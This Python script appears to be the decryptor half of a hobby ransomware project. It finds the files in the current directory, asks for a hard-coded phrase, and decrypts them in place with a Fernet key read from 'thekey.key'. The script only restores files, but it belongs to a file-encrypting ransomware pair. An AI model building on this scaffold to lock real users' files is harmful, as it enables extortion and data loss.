"""
USAGE - The code reads in files in the current directory (excluding some files), 
        and then prompts the user for a password. If the user enters the correct password, 
        it decrypts the files using a key stored in "thekey.key" file and prints a success message. 
        If the user enters the wrong password, it prints an error message. The encryption is 
        done using the Fernet module from the cryptography library.
        
AUTHOR - https://github.com/Ahendrix9624/
"""

import os
from cryptography.fernet import Fernet

#Find the Files we want to encrypt (^*_*^)

files = []

for file in os.listdir():
    if file == "not_ransomware" or file == "thekey.key" or file == "decrypt.py":
        continue
    if os.path.isfile(file):
        files.append(file)

with open("thekey.key", 'rb') as key:
    secretkey = key.read()

secretphrase = "password"
user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
    for file in files:
            with open(file, "rb") as thefile:
                    contents = thefile.read()
            contents_decrypted = Fernet(secretkey).decrypt(contents)
            with open(file, "wb") as thefile:
                    thefile.write(contents_decrypted)
            print("Congrats your files are decrypted. Enjoy the rest of your day.")
else:
    print("Wrong password. Cant brute force this bad boy!")
